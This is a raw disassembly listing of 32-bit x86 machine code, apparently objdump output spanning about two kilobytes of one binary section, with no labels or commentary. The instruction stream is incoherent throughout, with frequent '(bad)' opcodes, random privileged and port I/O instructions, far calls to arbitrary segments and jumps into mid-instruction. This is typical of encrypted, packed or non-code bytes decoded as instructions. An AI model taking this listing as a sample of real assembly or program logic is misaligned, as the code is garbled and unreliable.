  4113a1:	addps  xmm5,XMMWORD PTR [edx+0x5]
  4113a5:	lock aas 
  4113a7:	dec    eax
  4113a8:	mov    dh,0xce
  4113aa:	add    eax,0x713955b8
  4113af:	popf   
  4113b0:	outs   dx,DWORD PTR ds:[esi]
  4113b1:	jae    0x41133e
  4113b3:	sub    DWORD PTR [ebx+ecx*1+0x1315bd7e],0x7aa00280
  4113be:	in     al,dx
  4113bf:	fdiv   DWORD PTR [ecx+0x5f3e7ce7]
  4113c5:	ja     0x411446
  4113c7:	jg     0x4113c8
  4113c9:	mov    bh,0x5d
  4113cb:	cs push edi
  4113cd:	syscall 
  4113cf:	xlat   BYTE PTR ds:[ebx]
  4113d0:	xchg   BYTE PTR [esi-0x4912a732],al
  4113d6:	pop    esi
  4113d7:	scas   eax,DWORD PTR es:[edi]
  4113d8:	xlat   BYTE PTR ds:[ebx]
  4113d9:	push   0xffffffae
  4113db:	mov    ds:0xeb32803f,eax
  4113e0:	jb     0x41139b
  4113e2:	sbb    al,0xb1
  4113e4:	js     0x4113e4
  4113e6:	repnz in eax,0xcb
  4113e9:	pop    ss
  4113ea:	xor    al,0x4d
  4113ec:	mov    ebx,0xf3333330
  4113f1:	out    dx,al
  4113f2:	ret    0x42c2
  4113f5:	adc    al,0x80
  4113f7:	mov    edi,0x9db695e
  4113fc:	adc    esi,edx
  4113fe:	stc    
  4113ff:	cld    
  411400:	lds    edi,FWORD PTR [esi+edi*1+0x7f]
  411404:	jle    0x41147c
  411406:	jbe    0x4113de
  411408:	adc    ecx,DWORD PTR [eax]
  41140a:	add    al,0xd6
  41140c:	ja     0x411485
  41140e:	ja     0x4113ff
  411410:	or     al,BYTE PTR [esi]
  411412:	cmp    DWORD PTR [ebp+0x3e],0xffffff9f
  411416:	scas   eax,DWORD PTR es:[edi]
  411417:	iret   
  411418:	in     eax,0x72
  41141a:	lods   eax,DWORD PTR ds:[esi]
  41141b:	fwait
  41141c:	fwait
  41141d:	fwait
  41141e:	jmp    0x4113f6
  411420:	xor    al,0x4d
  411422:	mov    edi,eax
  411424:	jecxz  0x4113f9
  411426:	mov    cl,0x58
  411428:	in     al,dx
  411429:	(bad)  
  41142b:	jae    0x4114a0
  41142d:	xchg   DWORD PTR [ebx-0x2ee01b37],edx
  411433:	adc    BYTE PTR [esi-0x66],al
  411436:	hlt    
  411437:	lea    esi,[edi-0x32]
  41143a:	loope  0x41147e
  41143c:	das    
  41143d:	dec    ebx
  41143e:	shl    DWORD PTR [ebp+0x7cc9ea0b],cl
  411444:	jnp    0x4113ef
  411446:	mov    edi,0xaf6bc325
  41144b:	mov    ebp,0x55f006e6
  411450:	jmp    0x411457
  411452:	mov    bh,0xf0
  411454:	in     eax,dx
  411455:	gs sti 
  411457:	gs push ecx
  411459:	jg     0x411434
  41145b:	mov    dh,0xcc
  41145d:	out    0x27,eax
  41145f:	or     ecx,DWORD PTR [edx-0x19127472]
  411465:	jbe    0x411454
  411467:	call   0x9fdb788e
  41146c:	or     esp,DWORD PTR [edi*8-0x57670301]
  411473:	imul   ecx,DWORD PTR [ecx],0xbe014c7c
  411479:	into   
  41147a:	dec    ebp
  41147b:	js     0x4114e7
  41147d:	push   ecx
  41147e:	mov    al,ds:0x596a2de4
  411483:	loop   0x411409
  411485:	shr    edi,0xc5
  411488:	daa    
  411489:	je     0x411470
  41148b:	and    al,0xc0
  41148d:	sti    
  41148e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148f:	mov    BYTE PTR [ecx],dh
  411491:	or     bh,BYTE PTR [esi+0x6f]
  411494:	icebp  
  411495:	fldcw  WORD PTR [ecx+0x56eddb8c]
  41149b:	ja     0x41148b
  41149d:	fdivr  QWORD PTR [ecx+0x1389c4eb]
  4114a3:	pop    ds
  4114a4:	inc    edx
  4114a5:	scas   al,BYTE PTR es:[edi]
  4114a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114a7:	stc    
  4114a8:	mov    bh,0x40
  4114aa:	jmp    0x411488
  4114ac:	and    dh,BYTE PTR [eax]
  4114ae:	mov    cl,0xd4
  4114b0:	or     eax,0x7ae9d710
  4114b5:	mov    dl,0x72
  4114b7:	mov    dl,0xfd
  4114b9:	cld    
  4114ba:	sbb    cl,BYTE PTR [edx+0x4ac26964]
  4114c0:	or     DWORD PTR [eax+0x66c9400a],esp
  4114c6:	mov    bl,0xb9
  4114c8:	push   edi
  4114c9:	pop    edi
  4114ca:	jge    0x4114c1
  4114cc:	jnp    0x411451
  4114ce:	add    DWORD PTR [ebx+0x2be57e2f],0x5f
  4114d5:	jns    0x411485
  4114d7:	mov    ds:0xa45be3a3,eax
  4114dc:	loope  0x411531
  4114de:	test   eax,0x16161614
  4114e3:	xchg   esi,eax
  4114e4:	jl     0x411486
  4114e6:	xchg   BYTE PTR [ecx+0x20],ah
  4114e9:	xchg   ebx,eax
  4114ea:	leave  
  4114eb:	pusha  
  4114ec:	jle    0x41156c
  4114ee:	push   ds
  4114ef:	outs   dx,BYTE PTR ds:[esi]
  4114f0:	mov    bh,0xbb
  4114f2:	stos   BYTE PTR es:[edi],al
  4114f3:	imul   ebx,edx,0xc3c3c3db
  4114f9:	mov    edi,0x513264ce
  4114fe:	shl    DWORD PTR [esi*2+0x1bbe34d4],cl
  411505:	xor    eax,0x655e5c21
  41150a:	stos   BYTE PTR es:[edi],al
  41150b:	aad    0x52
  41150d:	ds lahf 
  41150f:	(bad)  
  411510:	cmp    BYTE PTR [edi-0x1ffd6031],bl
  411516:	push   esi
  411517:	adc    al,0xc5
  411519:	jmp    0x41158d
  41151b:	mov    ecx,0x3d3d3dfc
  411520:	sbb    edi,DWORD PTR [ebp-0x32890a2]
  411526:	cld    
  411527:	cld    
  411528:	dec    ecx
  411529:	pop    ebp
  41152a:	xlat   BYTE PTR ds:[ebx]
  41152b:	out    0xd0,eax
  41152d:	pusha  
  41152e:	inc    edx
  41152f:	out    dx,al
  411530:	iret   
  411531:	xchg   ebx,eax
  411532:	(bad)  
  411533:	out    0x2,eax
  411535:	iret   
  411536:	add    edi,DWORD PTR [ebx+0x62]
  411539:	es push esi
  41153b:	cmp    esp,DWORD PTR [ecx+0x72d3df17]
  411541:	lahf   
  411542:	popa   
  411543:	popf   
  411544:	mov    ds:0x472cb728,al
  411549:	rcl    BYTE PTR [esi+0x1a],1
  41154c:	movups xmm1,xmm7
  41154f:	in     eax,0x64
  411551:	inc    ecx
  411552:	ins    DWORD PTR es:[edi],dx
  411553:	ffreep st(0)
  411555:	push   edx
  411556:	xchg   ebx,eax
  411557:	lahf   
  411558:	xchg   ebx,eax
  411559:	sub    DWORD PTR [esi+eax*1],0x28ae0a20
  411560:	lock and al,0x74
  411563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411564:	lods   eax,DWORD PTR ds:[esi]
  411565:	dec    ecx
  411566:	mov    al,ds:0x654045b8
  41156b:	lds    edi,FWORD PTR [edx+0x7aa13272]
  411571:	add    dh,BYTE PTR [eax-0x660e8134]
  411577:	sub    BYTE PTR [ebx-0x6c],al
  41157a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41157b:	adc    esi,DWORD PTR [ebx-0x7f]
  41157e:	pop    ss
  41157f:	lods   eax,DWORD PTR ds:[esi]
  411580:	adc    ebx,DWORD PTR [esi]
  411582:	xor    al,0x14
  411584:	mov    ebx,0x29cf8b2c
  411589:	mov    dh,0x18
  41158b:	lock jne 0x41158e
  41158e:	sub    BYTE PTR [edi+0x7dbed8cb],dl
  411594:	sti    
  411595:	ss mov bh,0xdb
  411598:	fst    QWORD PTR [ecx-0x57]
  41159b:	push   esp
  41159c:	in     al,dx
  41159d:	dec    esp
  41159e:	jno    0x4115ee
  4115a0:	add    BYTE PTR [esi+0x6e],dh
  4115a3:	mov    ds:0x84cbfa68,al
  4115a8:	pop    ebx
  4115a9:	(bad)  
  4115aa:	cmp    DWORD PTR [eax-0x4c],ecx
  4115ad:	xor    BYTE PTR [eax-0x4d],ah
  4115b0:	sub    edx,DWORD PTR cs:[ebx+0x7b]
  4115b4:	mov    edi,0xc0658ee2
  4115b9:	jp     0x411563
  4115bb:	test   eax,0x5f91a9a9
  4115c0:	(bad)  
  4115c1:	cli    
  4115c2:	xlat   BYTE PTR ds:[ebx]
  4115c3:	(bad)  
  4115c4:	in     al,dx
  4115c5:	fnstenv [ebx+0x6db69fe7]
  4115cb:	fcomi  st,st(6)
  4115cd:	mov    eax,0xde7e1861
  4115d2:	arpl   WORD PTR [edx+0x3e765e83],cx
  4115d8:	lahf   
  4115d9:	jg     0x41163e
  4115db:	data16 data16 out 0xd5,al
  4115df:	pop    eax
  4115e0:	sub    al,0xf6
  4115e2:	xchg   ecx,eax
  4115e3:	imul   ebx,DWORD PTR [edx-0x191ce5f6],0x2ea0ae17
  4115ed:	sbb    al,0xa5
  4115ef:	push   0xffffffb5
  4115f1:	pop    edx
  4115f2:	lods   al,BYTE PTR ds:[esi]
  4115f3:	push   esp
  4115f4:	sub    bl,BYTE PTR [ecx+0x28f9f9f9]
  4115fa:	push   0xffffff82
  4115fc:	dec    ebp
  4115fd:	iret   
  4115fe:	daa    
  4115ff:	push   cs
  411600:	ret    
  411601:	and    eax,0xfcdcf3ae
  411606:	push   esi
  411607:	es (bad) 
  411609:	mov    dl,0x82
  41160b:	jp     0x411638
  41160d:	sbb    ebx,0x186f5eed
  411613:	xchg   BYTE PTR [edi+0x132ff99d],ah
  411619:	mul    ch
  41161b:	les    ecx,FWORD PTR [edx]
  41161d:	fs inc edx
  41161f:	(bad)  
  411620:	retf   0xe032
  411623:	sbb    DWORD PTR cs:[ebp+0x23efc00b],0x2e74fad3
  41162e:	aaa    
  41162f:	stos   DWORD PTR es:[edi],eax
  411630:	or     DWORD PTR [esp+ecx*1-0x517ca8bc],ebx
  411637:	inc    edi
  411638:	jecxz  0x411689
  41163a:	shl    BYTE PTR ds:0x7143ce29,cl
  411640:	and    al,0x3b
  411642:	retf   
  411643:	and    DWORD PTR [edx+0x102b14fd],0xf9f2005d
  41164d:	test   eax,0x7603593c
  411652:	popf   
  411653:	sahf   
  411654:	les    esp,FWORD PTR [edi-0x1d]
  411657:	mul    DWORD PTR ds:0x83060842
  41165d:	mov    ebp,0xcfdbb76e
  411662:	mov    edx,0x4d4b0397
  411667:	ins    DWORD PTR es:[edi],dx
  411668:	scas   al,BYTE PTR es:[edi]
  411669:	stc    
  41166a:	ror    DWORD PTR [esi+0x2e26291],0x4e
  411671:	xlat   BYTE PTR ds:[ebx]
  411672:	loopne 0x411635
  411674:	cmp    al,0x22
  411676:	xchg   ecx,eax
  411677:	gs pop ebx
  411679:	xchg   esi,eax
  41167a:	adc    dl,BYTE PTR [eax+0x2b84d1d5]
  411680:	sbb    dl,BYTE PTR ds:0xa2ab0eb8
  411686:	pop    es
  411687:	nop    esp
  41168a:	out    dx,eax
  41168b:	icebp  
  41168c:	js     0x41168a
  41168e:	mov    ch,0xc1
  411690:	rol    ecx,0xbf
  411693:	pop    ebx
  411694:	mov    edi,0xdcb7fd7e
  411699:	outs   dx,BYTE PTR ds:[esi]
  41169a:	ja     0x4116db
  41169c:	outs   dx,DWORD PTR ds:[esi]
  41169d:	sub    dl,BYTE PTR es:[edi+0x264c95cb]
  4116a4:	xor    esi,DWORD PTR [edx-0x2]
  4116a7:	cld    
  4116a8:	stc    
  4116a9:	pop    edi
  4116aa:	pushf  
  4116ab:	cmp    esi,DWORD PTR [edi-0x12]
  4116ae:	cmc    
  4116af:	mov    edx,0x18d007e0
  4116b4:	sub    al,0xe3
  4116b6:	push   0xffffff82
  4116b8:	or     ebp,DWORD PTR [ebx-0x337125c8]
  4116be:	scas   eax,DWORD PTR es:[edi]
  4116bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116c0:	aas    
  4116c1:	mov    esi,esi
  4116c3:	add    ecx,DWORD PTR [ebx+0x9]
  4116c6:	add    BYTE PTR [eax+0x4627f633],dl
  4116cc:	addr16 addr16 addr16 and al,0x93
  4116d1:	leave  
  4116d2:	pop    eax
  4116d3:	das    
  4116d4:	stos   DWORD PTR es:[edi],eax
  4116d5:	xchg   ebp,eax
  4116d6:	push   eax
  4116d7:	mov    bh,0x13
  4116d9:	cld    
  4116da:	push   esi
  4116db:	call   0x2d5e:0x98990b9f
  4116e2:	mov    bl,0x0
  4116e4:	mov    ebx,DWORD PTR fs:[eax+0x1f]
  4116e8:	push   ecx
  4116e9:	sub    BYTE PTR [eax-0x40],cl
  4116ec:	js     0x411747
  4116ee:	xor    edx,edi
  4116f0:	or     bh,BYTE PTR cs:[edi]
  4116f3:	aad    0x87
  4116f5:	xor    DWORD PTR [edx+esi*1+0x1292731f],0x78
  4116fd:	test   al,0x35
  4116ff:	leave  
  411700:	mov    es,WORD PTR [eax-0x307fe0d8]
  411706:	jno    0x411748
  411708:	mul    esi
  41170a:	jne    0x4116ed
  41170c:	add    DWORD PTR [edi],edi
  41170e:	jp     0x41171f
  411710:	mov    esp,0xd6e64265
  411715:	enter  0xd4a0,0xe6
  411719:	or     al,0xa7
  41171b:	icebp  
  41171c:	pop    ds
  41171d:	les    eax,FWORD PTR [eax-0x61]
  411720:	test   al,0x38
  411722:	inc    esp
  411723:	adc    ah,BYTE PTR [eax-0x3d1c234]
  411729:	jbe    0x411716
  41172b:	lods   eax,DWORD PTR ds:[esi]
  41172c:	test   BYTE PTR [edi+0x39],bh
  41172f:	fbld   TBYTE PTR [ebx-0x3a82c7d4]
  411735:	add    al,0xc0
  411737:	dec    ebp
  411738:	unpckhps xmm0,XMMWORD PTR [eax]
  41173b:	into   
  41173c:	popf   
  41173d:	cmp    esi,DWORD PTR [edi-0x16]
  411740:	fdivr  QWORD PTR [ecx+0x7a7aa773]
  411746:	jp     0x4116e6
  411748:	pop    edi
  411749:	mov    ch,0x6a
  41174b:	aad    0xad
  41174d:	mov    eax,ds:0x801d6850
  411752:	fisubr WORD PTR [edx-0x4b]
  411755:	pop    edx
  411756:	pop    eax
  411757:	pop    eax
  411758:	pop    eax
  411759:	clc    
  41175a:	js     0x4117d2
  41175c:	jbe    0x4117d4
  41175e:	pop    eax
  41175f:	xlat   BYTE PTR ds:[ebx]
  411760:	jne    0x41176f
  411762:	mov    ch,0xc4
  411764:	mov    DWORD PTR [esi-0x7faa01c2],edx
  41176a:	leave  
  41176b:	jle    0x4117e6
  41176d:	loopne 0x4117bd
  41176f:	xchg   esi,eax
  411770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411771:	ja     0x411718
  411773:	data16 (bad) 
  411775:	push   ebp
  411776:	sbb    ebx,0xa07936ed
  41177c:	ins    BYTE PTR es:[edi],dx
  41177d:	cmp    DWORD PTR [edx],eax
  41177f:	fimul  WORD PTR [edx-0x65]
  411782:	fistp  DWORD PTR [ebp-0x45ca37f9]
  411788:	int3   
  411789:	in     al,dx
  41178a:	pop    ss
  41178b:	xlat   BYTE PTR ds:[ebx]
  41178c:	pop    ebx
  41178d:	pop    ebp
  41178e:	lahf   
  41178f:	imul   ecx,DWORD PTR [ebp+0x59],0xffffff82
  411793:	lea    ebp,[eax+0x9]
  411796:	mov    ch,cl
  411798:	jne    0x411724
  41179a:	mov    ds:0xaa00212c,al
  41179f:	daa    
  4117a0:	or     eax,0x3fa64631
  4117a5:	xor    eax,0x5000531f
  4117aa:	or     al,0x1a
  4117ac:	push   edx
  4117ad:	jge    0x411797
  4117af:	(bad)  
  4117b1:	cmp    al,BYTE PTR [ecx+esi*1+0x2]
  4117b5:	out    dx,al
  4117b6:	sbb    dh,al
  4117b8:	ins    BYTE PTR es:[edi],dx
  4117b9:	inc    esp
  4117ba:	and    al,BYTE PTR [ecx+ebx*2]
  4117bd:	nop
  4117be:	nop
  4117bf:	pop    edi
  4117c0:	xchg   ebx,eax
  4117c1:	aas    
  4117c2:	xor    edi,DWORD PTR [ebp+0x52a54a87]
  4117c8:	lods   al,BYTE PTR ds:[esi]
  4117c9:	outs   dx,DWORD PTR ds:[esi]
  4117ca:	push   ebx
  4117cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117cc:	fucomp st(6)
  4117ce:	pop    ebx
  4117cf:	and    ah,BYTE PTR [ecx]
  4117d1:	out    0xda,al
  4117d3:	pop    edi
  4117d4:	xor    al,0xed
  4117d6:	and    DWORD PTR [ecx+0x17],ebx
  4117d9:	ror    DWORD PTR [ecx-0x4485080],0x6e
  4117e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e1:	fucomip st,st(7)
  4117e3:	daa    
  4117e4:	mov    cl,0x0
  4117e6:	clc    
  4117e7:	add    eax,0x5494ad89
  4117ec:	sub    dh,BYTE PTR ds:0x26a54a99
  4117f2:	test   DWORD PTR [ebx+0x7e],esp
  4117f5:	aam    0x32
  4117f7:	mov    ds:0xfa99a8dc,eax
  4117fc:	lods   eax,DWORD PTR ds:[esi]
  4117fd:	and    bl,BYTE PTR [eax-0x3c1dfb61]
  411803:	mov    al,dl
  411805:	dec    ebp
  411806:	call   0x5d34:0xab525e9e
  41180d:	icebp  
  41180e:	call   0x4ae3:0xe3e304d7
  411815:	pop    edi
  411816:	pop    edi
  411817:	pop    edi
  411818:	xchg   ebx,eax
  411819:	push   esi
  41181a:	add    ebp,esp
  41181c:	fld    QWORD PTR [eax]
  41181e:	cdq    
  41181f:	xchg   esi,eax
  411820:	pop    ss
  411821:	retf   
  411822:	mov    esp,DWORD PTR [ebp-0x47]
  411825:	sbb    DWORD PTR [esi+0x676f4d1c],edi
  41182b:	cli    
  41182c:	fcmovnu st,st(5)
  41182e:	sbb    ebx,DWORD PTR [eax+0x2a]
  411831:	and    al,0x76
  411833:	les    esp,FWORD PTR [ecx]
  411835:	and    edx,DWORD PTR [ecx]
  411837:	jno    0x411871
  411839:	ja     0x411815
  41183b:	inc    edi
  41183c:	ds cmp eax,0x4a95f099
  411842:	add    eax,0xcadfbf7e
  411847:	call   0xbb0e4d1f
  41184c:	xchg   esi,eax
  41184d:	sub    al,0xf2
  41184f:	dec    edi
  411850:	push   ss
  411851:	add    DWORD PTR [ecx+0x2250750c],edx
  411857:	add    ah,BYTE PTR [eax]
  411859:	(bad)
  41185e:	bound  ecx,QWORD PTR [ebx+eax*2+0x2e5daef6]
  411865:	pop    ss
  411866:	adc    cl,BYTE PTR [ecx+0x5cb94cc4]
  41186c:	(bad)  
  41186d:	shr    DWORD PTR [ebx+ecx*2],1
  411870:	mov    ds:0xea0b2fdf,al
  411875:	push   ecx
  411876:	cmp    DWORD PTR [ecx-0x1becd171],ebx
  41187c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41187d:	xlat   BYTE PTR ds:[ebx]
  41187e:	sub    eax,0xf1f6cafc
  411883:	imul   ecx,DWORD PTR [eax+0x4f85acd6],0x42
  41188a:	add    BYTE PTR [edx-0x1932fef6],dh
  411890:	nop
  411891:	retf   0xc9d6
  411894:	fdiv   QWORD PTR [esi-0x52a3aff5]
  41189a:	jp     0x411824
  41189c:	das    
  41189d:	inc    ebp
  41189e:	jl     0x4118a1
  4118a0:	mov    esp,0x975c542d
  4118a5:	pop    ebp
  4118a6:	out    dx,eax
  4118a7:	call   0xad56:0x964c9922
  4118ae:	pop    edx
  4118af:	aad    0x56
  4118b1:	dec    eax
  4118b2:	fs cmp esp,edi
  4118b5:	lods   eax,DWORD PTR ds:[esi]
  4118b6:	retf   0x72f3
  4118b9:	retf   
  4118ba:	adc    eax,0xdd8cb17e
  4118bf:	cmc    
  4118c0:	in     eax,dx
  4118c1:	add    al,0x8e
  4118c3:	fldenv [edx+0x79]
  4118c7:	xor    ecx,ecx
  4118c9:	inc    esi
  4118ca:	lods   al,BYTE PTR ds:[esi]
  4118cb:	mov    ds:0x834961a8,eax
  4118d0:	rol    DWORD PTR [esp+ebp*4],cl
  4118d3:	inc    eax
  4118d4:	ins    DWORD PTR es:[edi],dx
  4118d5:	rcl    BYTE PTR [edi],1
  4118d7:	dec    edx
  4118d8:	and    al,0xb
  4118da:	add    al,0x2
  4118dc:	push   esi
  4118dd:	xchg   ebx,eax
  4118de:	mov    dl,0x9d
  4118e0:	cdq    
  4118e1:	cs out dx,al
  4118e3:	mov    ds:0x548882d1,eax
  4118e8:	mov    eax,0x3fbe20d5
  4118ed:	mov    ebx,0x7b6bf2ba
  4118f2:	mov    ebp,0x7f3f9c5e
  4118f7:	jle    0x4118a7
  4118f9:	push   ds
  4118fa:	(bad)  
  4118fb:	out    dx,al
  4118fc:	mov    al,ds:0xdb59a3ea
  411901:	retf   
  411902:	push   edx
  411903:	jge    0x4118be
  411905:	dec    edi
  411906:	iret   
  411907:	shr    edx,1
  411909:	jnp    0x4118be
  41190b:	or     esp,DWORD PTR [edx+ecx*8]
  41190e:	adc    al,0x97
  411910:	sbb    bh,al
  411912:	xor    al,BYTE PTR [ebp+0xd5c2d73]
  411918:	add    ah,al
  41191a:	mov    cr1,edx
  41191d:	adc    ebx,ebp
  41191f:	aam    0x2e
  411921:	adc    bh,BYTE PTR [ecx+0x35]
  411924:	test   DWORD PTR [edi-0x34507829],ebx
  41192a:	sbb    BYTE PTR [ecx+0x76],dl
  41192d:	dec    esp
  41192e:	jbe    0x41192e
  411930:	xor    eax,0x1e5cb947
  411935:	shl    DWORD PTR [ecx*2+0x1d02040b],cl
  41193c:	mov    dl,0xc4
  41193e:	cwde   
  41193f:	jbe    0x411943
  411941:	sub    DWORD PTR [ebx-0x46297e6],esi
  411947:	test   DWORD PTR [ecx+edx*8],0xb1d7e7cc
  41194e:	and    ecx,DWORD PTR [edx]
  411950:	push   cs
  411951:	xor    DWORD PTR [ebp-0x6a],edi
  411954:	aaa    
  411955:	lahf   
  411956:	icebp  
  411957:	std    
  411958:	pop    esp
  411959:	loopne 0x411920
  41195b:	jmp    0x4118e6
  41195d:	add    ah,BYTE PTR [edi]
  41195f:	mov    edx,0xa8009c01
  411964:	retf   
  411965:	aaa    
  411966:	pop    ebp
  411967:	das    
  411968:	lahf   
  411969:	iret   
  41196a:	add    eax,DWORD PTR [eax]
  41196c:	cld    
  41196d:	jle    0x4119ae
  41196f:	inc    edx
  411970:	mov    eax,ds:0xb76edc10
  411975:	xor    eax,0x3b9d804e
  41197a:	shr    BYTE PTR [edi-0x75fdceb5],0x31
  411981:	mov    BYTE PTR [ebp-0x5e],dh
  411984:	cli    
  411985:	mov    BYTE PTR [ecx+0x46],cl
  411988:	jbe    0x4119ae
  41198a:	mov    eax,0x4698b8b8
  41198f:	lods   eax,DWORD PTR ds:[esi]
  411990:	add    eax,0x89dc678b
  411995:	out    0x3d,al
  411997:	mul    edi
  411999:	scas   eax,DWORD PTR es:[edi]
  41199a:	les    ecx,FWORD PTR [edi+0x654efbb7]
  4119a0:	fbstp  TBYTE PTR [ebx-0x36ec13d7]
  4119a6:	mov    al,ds:0x2c2d709
  4119ab:	mov    al,ds:0x5c8d056d
  4119b0:	data16 sub BYTE PTR [eax],0xf0
  4119b4:	xlat   BYTE PTR ds:[ebx]
  4119b5:	call   0xe87f:0x3b6dc400
  4119bc:	push   ebx
  4119bd:	adc    eax,0x34d30e7a
  4119c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c3:	repnz stc 
  4119c5:	cld    
  4119c6:	leave  
  4119c7:	dec    eax
  4119c8:	and    al,0xf2
  4119ca:	adc    eax,0xfd11e33e
  4119cf:	mov    dh,0x13
  4119d1:	jb     0x411a44
  4119d3:	pop    ebp
  4119d4:	aam    0xba
  4119d6:	lods   eax,DWORD PTR ds:[esi]
  4119d7:	mov    BYTE PTR [ebp+edx*8+0x26de0e7e],ah
  4119de:	or     dl,BYTE PTR cs:0x248bfbf
  4119e5:	mov    dl,0x32
  4119e7:	push   esp
  4119e8:	das    
  4119e9:	push   ds
  4119ea:	aaa    
  4119eb:	add    BYTE PTR [edx-0x26],ch
  4119ee:	cdq    
  4119ef:	sti    
  4119f0:	fadd   QWORD PTR [eax]
  4119f2:	lods   al,BYTE PTR ds:[esi]
  4119f3:	mov    dh,0x7e
  4119f5:	sbb    cl,BYTE PTR [ebp-0x66]
  4119f8:	scas   al,BYTE PTR es:[edi]
  4119f9:	dec    ebx
  4119fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119fb:	jg     0x411a44
  4119fd:	inc    edi
  4119fe:	pop    es
  4119ff:	cmp    bh,BYTE PTR [edx]
  411a01:	cmp    ah,al
  411a03:	idiv   ebx
  411a05:	lods   eax,DWORD PTR ds:[esi]
  411a06:	fisub  WORD PTR [edx+0x9c1eaad]
  411a0c:	xor    BYTE PTR [edi],0x73
  411a0f:	mov    bh,BYTE PTR [ecx]
  411a11:	add    ah,BYTE PTR [edx-0x2e]
  411a14:	nop
  411a15:	int3   
  411a16:	pop    edx
  411a17:	bnd jp 0x4119d7
  411a1a:	dec    eax
  411a1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1c:	rcl    DWORD PTR [ebp-0x6030180d],cl
  411a22:	inc    edi
  411a23:	int    0xbd
  411a25:	in     eax,0xc2
  411a27:	cs mov bl,0x74
  411a2a:	fistp  WORD PTR gs:[eax-0xc4bc414]
  411a31:	jmp    0x2ebb6723
  411a36:	in     al,0x7c
  411a38:	pop    ebp
  411a39:	ins    BYTE PTR es:[edi],dx
  411a3a:	rcl    DWORD PTR [edx+0x7b120676],1
  411a40:	or     al,0x5d
  411a42:	or     eax,0x31007ab4
  411a47:	mov    edx,0x45835c6e
  411a4c:	(bad)  
  411a4d:	jp     0x4119f1
  411a4f:	jmp    0x5030f078
  411a54:	xchg   bh,al
  411a56:	pop    ds
  411a57:	jg     0x411a35
  411a59:	aam    0x34
  411a5b:	in     eax,dx
  411a5c:	in     eax,dx
  411a5d:	dec    eax
  411a5e:	and    al,0x62
  411a60:	jmp    0x411ac1
  411a62:	mov    bh,0xf3
  411a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a65:	gs call 0x8edf:0xb76f979a
  411a6d:	sbb    BYTE PTR [eax+ecx*4+0x44],al
  411a71:	and    BYTE PTR [esi-0x75946d45],bl
  411a77:	out    0x71,eax
  411a79:	imul   eax,DWORD PTR [ebp-0x4aaaaa2a],0xffffff86
  411a80:	rcl    BYTE PTR [esi],cl
  411a82:	iret   
  411a83:	loope  0x411a1b
  411a85:	add    DWORD PTR ds:0x9fe7c21c,ecx
  411a8b:	pop    esp
  411a8c:	push   cs
  411a8d:	call   0x28a2aef0
  411a92:	pop    ebx
  411a93:	fs (bad) 
  411a95:	adc    ebx,ebp
  411a97:	jae    0x411b03
  411a99:	push   0x6a
  411a9b:	xor    dl,BYTE PTR [esi]
  411a9d:	mov    ecx,ebp
  411a9f:	mov    ds:0x2b73f331,eax
  411aa4:	cmps   DWORD PTR gs:[si],DWORD PTR es:[di]
  411aa7:	(bad)
  411aaa:	iret   
  411aab:	mov    dl,0x63
  411aad:	nop
  411aae:	sbb    al,0x13
  411ab0:	test   DWORD PTR [esp+edi*8+0x15],ebx
  411ab4:	sbb    ebp,0x4d
  411ab7:	mov    eax,0x2bc00416
  411abc:	fldl2e 
  411abe:	rcr    DWORD PTR [edx+0x3d],0xf8
  411ac2:	daa    
  411ac3:	pop    ecx
  411ac4:	pop    edx
  411ac5:	inc    ebp
  411ac6:	rep ins DWORD PTR es:[edi],dx
  411ac8:	and    DWORD PTR [ecx],0x7f
  411acb:	dec    edx
  411acc:	fs mov bl,0xd9
  411acf:	mov    bl,0xb9
  411ad1:	pop    esp
  411ad2:	push   cs
  411ad3:	cmp    eax,0xf3523d3d
  411ad8:	cwde   
  411ad9:	call   DWORD PTR [edx]
  411adb:	fisubr DWORD PTR [ecx-0x1]
  411ade:	push   esi
  411adf:	xchg   esi,eax
  411ae0:	add    BYTE PTR [edi],ch
  411ae2:	and    edx,DWORD PTR [ebx]
  411ae4:	dec    edx
  411ae5:	scas   al,BYTE PTR es:[edi]
  411ae6:	sub    DWORD PTR [ebp+0x5a],esp
  411ae9:	mov    ah,0x95
  411aeb:	mov    esp,DWORD PTR [eax+0x47]
  411aee:	or     BYTE PTR [edx-0x3337ec86],dh
  411af4:	xchg   esi,eax
  411af5:	sub    eax,0x7069134
  411afa:	imul   esp,DWORD PTR [edi+0x1a],0x3329664
  411b01:	push   edi
  411b02:	lods   eax,DWORD PTR ds:[esi]
  411b03:	pop    edx
  411b04:	lea    edi,gs:[ecx]
  411b07:	shr    dh,1
  411b09:	sahf   
  411b0a:	loop   0x411b4a
  411b0c:	adc    bh,BYTE PTR [eax+0x3e]
  411b0f:	pushf  
  411b10:	cmp    BYTE PTR ds:0x7534ba62,ch
  411b16:	imul   edi,edi,0xfe0f83e0
  411b1c:	pusha  
  411b1d:	call   0xb992:0x39720166
  411b24:	cwde   
  411b25:	mov    dl,0x6f
  411b27:	push   edx
  411b28:	push   esi
  411b29:	mov    dh,0x9d
  411b2b:	sbb    DWORD PTR [edi+0x4a],ebp
  411b2e:	push   ss
  411b2f:	push   ds
  411b30:	rcl    BYTE PTR [esi],1
  411b32:	fwait
  411b33:	mov    dh,0x6d
  411b35:	pop    ebp
  411b36:	(bad)  
  411b37:	imul   eax,DWORD PTR [ebp+0x0],0x1c
  411b3b:	xlat   BYTE PTR ds:[ebx]
  411b3c:	inc    edx
  411b3d:	enter  0x74af,0xf9
  411b41:	dec    esp
  411b42:	mov    ds:0x3e1ead5a,al
  411b47:	jnp    0x411b3f
  411b49:	in     al,dx
  411b4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4b:	mov    ds:0xedede828,al
  411b50:	mov    ch,0x3e
  411b52:	pusha  
  411b53:	pop    ecx
